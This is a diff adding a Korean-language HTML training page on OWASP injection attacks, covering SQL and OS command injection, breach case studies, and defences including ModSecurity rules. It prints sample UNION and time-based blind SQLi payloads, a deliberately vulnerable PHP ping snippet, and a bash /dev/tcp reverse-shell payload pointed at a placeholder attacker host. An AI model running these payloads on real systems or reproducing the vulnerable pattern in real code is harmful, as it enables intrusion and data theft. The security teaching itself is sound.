@@ -1,1 +1,332 @@
-sdf
+<!DOCTYPE html>
+<html lang="ko" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OWASP Top 10: 2021 전문가 심화 과정</title>
+    <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700;900&family=Fira+Code:wght@400;500&display=swap');
+        body { 
+            font-family: 'Noto Sans KR', sans-serif; 
+            background-color: #020617; 
+            color: #f8fafc; 
+            margin: 0; padding: 0;
+            line-height: 1.8;
+        }
+        .terminal-bg { background-color: #020617; border: 1px solid #1e293b; }
+        .text-glow { text-shadow: 0 0 10px rgba(34, 211, 238, 0.4); }
+        .section-card { background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(51, 65, 85, 0.5); backdrop-filter: blur(12px); }
+        .code-block { font-family: 'Fira Code', monospace; }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #0ea5e9; }
+        .breach-box { border-left: 4px solid #ef4444; background: rgba(239, 68, 68, 0.05); }
+        .step-tag { background: linear-gradient(90deg, #06b6d4, #3b82f6); color: #020617; font-weight: 900; padding: 2px 8px; border-radius: 4px; font-size: 10px; }
+        .glossary-box { background: rgba(15, 23, 42, 0.9); border-top: 1px solid rgba(51, 65, 85, 0.8); }
+        .infographic-node { background: #1e293b; border: 1px solid #334155; transition: all 0.3s ease; }
+        .infographic-node:hover { border-color: #06b6d4; transform: translateY(-2px); }
+    </style>
+</head>
+<body class="antialiased pb-20">
+
+    <!-- Header -->
+    <header class="border-b border-slate-800 bg-slate-900/50 sticky top-0 z-50 backdrop-blur-md">
+        <div class="max-w-6xl mx-auto px-6 py-8 flex justify-between items-center">
+            <div>
+                <div class="flex items-center gap-2 mb-2">
+                    <span class="bg-cyan-500 text-slate-900 px-2 py-0.5 text-[10px] font-black uppercase tracking-widest rounded-sm shadow-[0_0_10px_rgba(34,211,238,0.5)]">Cyber Security Lab</span>
+                    <span class="text-slate-500 font-mono text-[10px]">SEC-OWASP-01 | Injection Specialist</span>
+                </div>
+                <h1 class="text-4xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-blue-500 to-indigo-500 tracking-tight leading-tight">
+                    A03:2021-Injection Masterclass<br><span class="text-slate-100 text-2xl text-glow">침투 메커니즘 분석 및 아키텍처 보안</span>
+                </h1>
+            </div>
+            <div class="text-right hidden md:block border-l border-slate-800 pl-6">
+                <div class="bg-red-500/10 text-red-400 border border-red-500/20 px-4 py-2 rounded-xl text-sm font-black font-mono shadow-lg">
+                    THREAT LEVEL: CRITICAL
+                </div>
+                <p class="text-[10px] text-slate-500 mt-2 tracking-widest uppercase">System Architect Expert</p>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-6xl mx-auto px-6 py-16 space-y-48">
+
+        <!-- 1. SQL Injection Deep Dive -->
+        <section id="sql-injection">
+            <h2 class="text-3xl font-black border-l-8 border-cyan-500 pl-6 text-slate-100 mb-12 tracking-tight">
+                1. SQL 인젝션 (SQL Injection, SQL 주입 공격)
+            </h2>
+            
+            <div class="section-card rounded-3xl overflow-hidden shadow-2xl space-y-12">
+                <div class="p-10 space-y-8">
+                    <h3 class="text-xl font-bold text-cyan-400 flex items-center gap-3">
+                        <i data-lucide="shield-alert" class="w-6 h-6"></i> 공격 메커니즘 및 침투 프로세스
+                    </h3>
+                    <p class="text-slate-300 leading-relaxed">
+                        SQL 인젝션은 공격자가 애플리케이션의 입력 인터페이스를 통해 악의적인 SQL 구문을 삽입하여, 백엔드 데이터베이스(DB)에서 의도하지 않은 쿼리가 실행되도록 만드는 공격입니다. 단순히 인증을 우회하는 것을 넘어, 전체 데이터베이스의 내용을 탈취(Exfiltration)하거나 파괴할 수 있습니다.
+                    </p>
+
+                    <!-- 침투 프로세스 도식화 -->
+                    <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-10">
+                        <h4 class="text-center font-bold text-slate-400 mb-12 text-xs tracking-widest uppercase">
+                            [인포그래픽: SQL 인젝션 공격 워크플로우 (SQLi Attack Workflow)]
+                        </h4>
+                        <div class="grid grid-cols-1 md:grid-cols-5 gap-4 items-center">
+                            <div class="infographic-node p-4 rounded-xl text-center">
+                                <i data-lucide="search" class="w-8 h-8 text-blue-400 mx-auto mb-2"></i>
+                                <div class="text-[10px] text-blue-400 font-bold mb-1">RECON</div>
+                                <div class="text-[11px] text-slate-200">취약점 탐색<br>(Error 유도)</div>
+                            </div>
+                            <div class="text-center text-slate-600"><i data-lucide="chevrons-right" class="w-6 h-6 mx-auto"></i></div>
+                            <div class="infographic-node p-4 rounded-xl text-center border-yellow-500/30">
+                                <i data-lucide="flask-conical" class="w-8 h-8 text-yellow-400 mx-auto mb-2"></i>
+                                <div class="text-[10px] text-yellow-400 font-bold mb-1">PROBE</div>
+                                <div class="text-[11px] text-slate-200">DB 구조 파악<br>(Column 수 확인)</div>
+                            </div>
+                            <div class="text-center text-slate-600"><i data-lucide="chevrons-right" class="w-6 h-6 mx-auto"></i></div>
+                            <div class="infographic-node p-4 rounded-xl text-center border-red-500/30">
+                                <i data-lucide="database-zap" class="w-8 h-8 text-red-500 mx-auto mb-2"></i>
+                                <div class="text-[10px] text-red-500 font-bold mb-1">EXPLOIT</div>
+                                <div class="text-[11px] text-slate-200">데이터 추출<br>(UNION 활용)</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                        <div class="space-y-4">
+                            <h4 class="text-lg font-bold text-slate-100 flex items-center gap-2">
+                                <i data-lucide="move-right" class="w-4 h-4 text-cyan-500"></i> 핵심 기법: UNION-based SQLi
+                            </h4>
+                            <p class="text-sm text-slate-400">
+                                두 개의 SELECT 결과를 합치는 UNION 연산자를 사용합니다. 정상적인 결과 뒤에 공격자가 원하는 테이블 정보를 붙여 화면에 출력시킵니다.
+                            </p>
+                            <div class="terminal-bg p-4 rounded-xl font-mono text-xs">
+                                <span class="text-slate-500">-- 공격 쿼리 예시</span><br>
+                                ' UNION SELECT NULL, table_name, NULL FROM information_schema.tables --
+                            </div>
+                        </div>
+                        <div class="space-y-4">
+                            <h4 class="text-lg font-bold text-slate-100 flex items-center gap-2">
+                                <i data-lucide="move-right" class="w-4 h-4 text-cyan-500"></i> 핵심 기법: Blind SQLi
+                            </h4>
+                            <p class="text-sm text-slate-400">
+                                결과가 화면에 직접 나오지 않을 때, 참/거짓에 따른 반응이나 시간 지연(Time-based)을 이용하여 데이터를 한 글자씩 알아내는 고차원 기법입니다.
+                            </p>
+                            <div class="terminal-bg p-4 rounded-xl font-mono text-xs">
+                                <span class="text-slate-500">-- 시간 지연 유도</span><br>
+                                ' AND IF(SUBSTR(pw,1,1)='a', SLEEP(5), 0) --
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="breach-box p-8 rounded-r-2xl">
+                        <h4 class="text-red-400 font-black text-sm mb-4 uppercase tracking-wider">Breach Case Study: Heartland Payment Systems (2008)</h4>
+                        <p class="text-sm text-slate-300 italic mb-4">
+                            하트랜드 페이먼트 시스템즈는 전 세계 카드 결제의 상당 부분을 처리하는 대행사였으나, <strong>SQL 인젝션 단 한 건</strong>으로 인해 약 1억 3천만 건의 신용카드 번호가 노출되었습니다. 공격자 알버트 곤잘레스는 취약한 로그인 폼을 통해 DB에 침투한 뒤, 스니퍼(Sniffer)를 설치하여 수개월간 실시간 거래 데이터를 탈취했습니다.
+                        </p>
+                        <div class="flex gap-4">
+                            <span class="step-tag">피해액</span><span class="text-xs text-slate-500 italic">약 1억 4천만 달러 이상의 보상 및 과징금 발생</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Glossary -->
+                <div class="glossary-box p-10 grid grid-cols-1 md:grid-cols-2 gap-10">
+                    <div class="text-xs text-slate-400 leading-loose">
+                        <span class="text-cyan-400 font-black block mb-4 uppercase tracking-widest border-b border-cyan-900 pb-2">Technical Terminology</span>
+                        <ul class="space-y-3">
+                            <li>• <strong>RDBMS (Relational Database Management System, 관계형 데이터베이스 관리 시스템):</strong> 데이터를 테이블 구조로 관리하는 시스템 (MySQL, Oracle 등).</li>
+                            <li>• <strong>Exfiltration (엑스필트레이션, 데이터 유출):</strong> 권한 없이 데이터를 외부로 빼돌리는 행위.</li>
+                            <li>• <strong>Information Schema (정보 스키마):</strong> 데이터베이스 내의 테이블, 컬럼명 등 모든 메타데이터를 담고 있는 특수 테이블.</li>
+                        </ul>
+                    </div>
+                    <div class="text-xs text-slate-400 leading-loose border-l border-slate-700/50 pl-10">
+                        <span class="text-yellow-400 font-black block mb-4 uppercase tracking-widest border-b border-yellow-900 pb-2">Notation & Operators</span>
+                        <ul class="space-y-3">
+                            <li>• <strong>UNION:</strong> 두 개 이상의 SELECT 문 결과 집합을 하나로 결합하는 SQL 연산자.</li>
+                            <li>• <strong>-- (Double Dash):</strong> SQL에서 이후의 모든 구문을 주석으로 처리하여 무력화하는 기호.</li>
+                            <li>• <strong>SLEEP(n):</strong> 쿼리 실행을 의도적으로 n초간 중단시켜 시간 기반 블라인드 인젝션을 수행할 때 사용하는 함수.</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 2. OS Command Injection Deep Dive -->
+        <section id="os-injection">
+            <h2 class="text-3xl font-black border-l-8 border-orange-500 pl-6 text-slate-100 mb-12 tracking-tight">
+                2. OS 커맨드 인젝션 (OS Command Injection, 명령 주입)
+            </h2>
+            
+            <div class="section-card rounded-3xl overflow-hidden shadow-2xl space-y-12">
+                <div class="p-10 space-y-10">
+                    <h3 class="text-xl font-bold text-orange-400 flex items-center gap-3">
+                        <i data-lucide="terminal" class="w-6 h-6"></i> 공격 원리 및 리버스 쉘 메커니즘
+                    </h3>
+                    <p class="text-slate-300 leading-relaxed">
+                        애플리케이션이 외부 입력을 사용하여 시스템 명령어를 생성할 때, 명령어를 구분하는 특수 기호(Metacharacters)를 삽입하여 공격자의 임의 명령어를 실행하는 기술입니다. 이는 웹 서버의 권한으로 시스템 파일에 접근하거나, <strong>리버스 쉘(Reverse Shell)</strong>을 통해 외부에서 서버를 직접 조작할 수 있게 합니다.
+                    </p>
+
+                    <!-- 침투 메커니즘 도식 -->
+                    <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-10 flex flex-col items-center">
+                        <h4 class="text-center font-bold text-slate-400 mb-8 text-xs tracking-widest uppercase">
+                            [도식: 리버스 쉘 침투 과정 (Reverse Shell Attack Flow)]
+                        </h4>
+                        <div class="relative w-full max-w-2xl py-12 px-6 border-2 border-dashed border-slate-700 rounded-3xl">
+                            <div class="flex justify-between items-center relative z-10">
+                                <div class="p-6 bg-slate-800 border border-slate-700 rounded-2xl text-center shadow-2xl">
+                                    <i data-lucide="monitor" class="w-10 h-10 text-red-500 mx-auto mb-2"></i>
+                                    <div class="text-xs font-black text-slate-200">Attacker Machine</div>
+                                    <div class="text-[10px] text-red-400 mt-1">Listening... (nc -lvp 4444)</div>
+                                </div>
+                                <div class="flex-1 flex flex-col items-center">
+                                    <div class="h-0.5 w-full bg-gradient-to-r from-red-500 to-cyan-500 mb-2"></div>
+                                    <div class="text-[10px] text-slate-500 font-black uppercase">Outbound Connection</div>
+                                </div>
+                                <div class="p-6 bg-slate-800 border border-slate-700 rounded-2xl text-center shadow-2xl">
+                                    <i data-lucide="server" class="w-10 h-10 text-cyan-400 mx-auto mb-2"></i>
+                                    <div class="text-xs font-black text-slate-200">Victim Web Server</div>
+                                    <div class="text-[10px] text-cyan-400 mt-1">RCE Vulnerable!</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                        <div class="bg-slate-800/40 p-8 rounded-2xl border border-slate-700 shadow-lg">
+                            <h4 class="font-bold text-slate-100 mb-4 uppercase tracking-tighter">Vulnerable Implementation (PHP)</h4>
+                            <div class="terminal-bg p-4 rounded-xl font-mono text-xs leading-loose">
+                                $ip = $_GET['ip'];<br>
+                                <span class="text-slate-500">// 입력값 검증 없이 쉘 실행</span><br>
+                                system("ping -c 4 " . $ip);
+                            </div>
+                        </div>
+                        <div class="bg-slate-800/40 p-8 rounded-2xl border border-slate-700 shadow-lg">
+                            <h4 class="font-bold text-slate-100 mb-4 uppercase tracking-tighter">Exploit Payload</h4>
+                            <div class="terminal-bg p-4 rounded-xl font-mono text-xs text-red-400">
+                                127.0.0.1 <span class="text-white">;</span> /bin/bash -i &gt;&amp; /dev/tcp/attacker_ip/4444 0&gt;&amp;1
+                            </div>
+                            <p class="text-[10px] text-slate-500 mt-4 leading-relaxed">
+                                위 페이로드는 세미콜론(;)을 이용해 기존 명령을 끝내고, 공격자의 서버로 연결을 시도하는 리눅스 배시(Bash) 쉘 명령을 실행합니다.
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="breach-box p-8 rounded-r-2xl border-orange-500/50 bg-orange-500/5">
+                        <h4 class="text-orange-400 font-black text-sm mb-4 uppercase tracking-wider">Breach Case Study: Equifax (2017)</h4>
+                        <p class="text-sm text-slate-300 italic mb-4">
+                            미국 신용평가사 에퀴팩스는 <strong>Apache Struts2</strong>라는 프레임워크의 취약점 때문에 약 1억 4,700만 명의 개인정보를 유출했습니다. 해당 취약점은 HTTP 헤더를 통해 임의의 명령어를 주입할 수 있는 <strong>OS 커맨드 인젝션(RCE)</strong> 계열의 결함이었으며, 패치되지 않은 서버를 노린 공격자에 의해 대규모 개인 식별 정보(PII)가 유출되었습니다.
+                        </p>
+                        <div class="flex gap-4">
+                            <span class="step-tag bg-orange-600">CVE ID</span><span class="text-xs text-slate-500 font-mono">CVE-2017-5638</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Glossary -->
+                <div class="glossary-box p-10 grid grid-cols-1 md:grid-cols-2 gap-10">
+                    <div class="text-xs text-slate-400 leading-loose">
+                        <span class="text-orange-400 font-black block mb-4 uppercase tracking-widest border-b border-orange-900 pb-2">Technical Terminology</span>
+                        <ul class="space-y-3">
+                            <li>• <strong>RCE (Remote Code Execution, 원격 코드 실행):</strong> 네트워크를 통해 공격자가 대상 시스템에서 임의의 코드를 실행할 수 있는 상태.</li>
+                            <li>• <strong>Reverse Shell (리버스 쉘):</strong> 피해자가 공격자에게 연결을 시도하도록 하여 방화벽(Inbound 차단)을 우회하는 해킹 기법.</li>
+                            <li>• <strong>Metacharacters (메타 문자):</strong> 쉘에서 특정 의미를 가지는 기호들 (; , | , & , $ 등).</li>
+                        </ul>
+                    </div>
+                    <div class="text-xs text-slate-400 leading-loose border-l border-slate-700/50 pl-10">
+                        <span class="text-orange-400 font-black block mb-4 uppercase tracking-widest border-b border-orange-900 pb-2">Metacharacter Glossary</span>
+                        <ul class="space-y-3">
+                            <li>• <strong>; (Semicolon):</strong> 앞의 명령어가 성공하든 실패하든 무관하게 다음 명령어를 실행함.</li>
+                            <li>• <strong>| (Pipe):</strong> 앞 명령어의 결과(Output)를 뒤 명령어의 입력(Input)으로 전달함.</li>
+                            <li>• <strong>& (Background):</strong> 앞 명령어를 백그라운드로 실행하고 즉시 다음 명령어를 수행함.</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 3. Defense & Security Architecture -->
+        <section id="security-architecture">
+            <h2 class="text-3xl font-black border-l-8 border-green-500 pl-6 text-slate-100 mb-12 tracking-tight">
+                3. 보안 아키텍처 및 대응 체계 (Security Defense)
+            </h2>
+            
+            <div class="section-card rounded-3xl overflow-hidden shadow-2xl space-y-12">
+                <div class="p-10 space-y-12">
+                    <h3 class="text-xl font-bold text-green-400 flex items-center gap-3">
+                        <i data-lucide="shield-check" class="w-6 h-6"></i> 계층형 방어 전략 (Defense in Depth)
+                    </h3>
+                    
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                        <div class="p-6 bg-slate-800 border border-green-900/30 rounded-2xl shadow-xl">
+                            <div class="bg-green-500 text-slate-900 w-8 h-8 rounded-full flex items-center justify-center font-black mb-4">1</div>
+                            <h4 class="font-bold text-slate-100 mb-2">Query Parameterization</h4>
+                            <p class="text-[11px] text-slate-400 leading-relaxed">준비된 문구(Prepared Statements)를 사용하여 데이터와 로직을 완전 분리합니다. SQL 인젝션의 유일한 근본 대책입니다.</p>
+                        </div>
+                        <div class="p-6 bg-slate-800 border border-green-900/30 rounded-2xl shadow-xl">
+                            <div class="bg-green-500 text-slate-900 w-8 h-8 rounded-full flex items-center justify-center font-black mb-4">2</div>
+                            <h4 class="font-bold text-slate-100 mb-2">Contextual Encoding</h4>
+                            <p class="text-[11px] text-slate-400 leading-relaxed">데이터가 출력되는 문맥(HTML, JavaScript, OS Shell)에 맞는 이스케이프(Escape) 처리를 강제합니다.</p>
+                        </div>
+                        <div class="p-6 bg-slate-800 border border-green-900/30 rounded-2xl shadow-xl">
+                            <div class="bg-green-500 text-slate-900 w-8 h-8 rounded-full flex items-center justify-center font-black mb-4">3</div>
+                            <h4 class="font-bold text-slate-100 mb-2">WAF Deployment</h4>
+                            <p class="text-[11px] text-slate-400 leading-relaxed">웹 방화벽(WAF)을 전면에 배치하여 알려진 인젝션 패턴(Signature)을 실시간으로 탐지 및 차단합니다.</p>
+                        </div>
+                    </div>
+
+                    <div class="space-y-6">
+                        <h4 class="text-lg font-bold text-slate-100 flex items-center gap-2">
+                            <i data-lucide="shield-plus" class="w-5 h-5 text-green-500"></i> 아키텍트 추천 보안 설정 (Nginx/ModSecurity)
+                        </h4>
+                        <div class="terminal-bg p-8 rounded-2xl font-mono text-sm leading-relaxed shadow-inner">
+                            <span class="text-slate-500"># SQLi & CMD Injection 탐지 룰 예시</span><br>
+                            SecRule ARGS "@rx (?i)(union|select|insert|update|delete|drop)" \<br>
+                            &nbsp;&nbsp;"id:1001,phase:2,deny,status:403,log,msg:'Potential SQL Injection Detected'"<br><br>
+                            SecRule ARGS "@rx (?i)(\;\s*|\|\s*|\&\&\s*|\`|\$)" \<br>
+                            &nbsp;&nbsp;"id:1002,phase:2,deny,status:403,log,msg:'Potential Command Injection Detected'"
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Glossary -->
+                <div class="glossary-box p-10 grid grid-cols-1 md:grid-cols-2 gap-10">
+                    <div class="text-xs text-slate-400 leading-loose">
+                        <span class="text-green-400 font-black block mb-4 uppercase tracking-widest border-b border-green-900 pb-2">Defense Glossary</span>
+                        <ul class="space-y-3">
+                            <li>• <strong>WAF (Web Application Firewall, 웹 방화벽):</strong> HTTP 트래픽을 모니터링하고 분석하여 웹 취약점 공격을 차단하는 보안 장비.</li>
+                            <li>• <strong>Parameterized Query (매개변수화된 쿼리):</strong> 쿼리 템플릿을 먼저 컴파일하고 데이터는 나중에 바인딩하여 실행하는 방식.</li>
+                        </ul>
+                    </div>
+                    <div class="text-xs text-slate-400 leading-loose border-l border-slate-700/50 pl-10">
+                        <span class="text-green-400 font-black block mb-4 uppercase tracking-widest border-b border-green-900 pb-2">Security Architecture Initials</span>
+                        <ul class="space-y-3">
+                            <li>• <strong>SDLC (Software Development Life Cycle, 소프트웨어 개발 생명 주기):</strong> 보안이 단계별로 내재화되어야 할 소프트웨어 개발 전체 과정.</li>
+                            <li>• <strong>PII (Personally Identifiable Information, 개인 식별 정보):</strong> 이름, 주민번호 등 특정 개인을 식별할 수 있는 민감 정보.</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <footer class="max-w-6xl mx-auto px-6 py-12 border-t border-slate-800 text-center">
+        <div class="text-slate-500 font-mono text-[10px] tracking-widest uppercase mb-4">
+            © 2026 Gemini Security Solutions. IP Expert Series.
+        </div>
+        <p class="text-slate-600 text-[10px] leading-relaxed max-w-2xl mx-auto italic">
+            이 문서는 고도의 기술적 분석을 포함하고 있으며, 기업 보안 진단 및 전문가 교육을 위해 최적화되었습니다. 본 내용을 무단 전재할 시 보안 규정에 따라 책임이 따를 수 있습니다.
+        </p>
+    </footer>
+
+    <script>
+        lucide.createIcons();
+    </script>
+</body>
+</html>
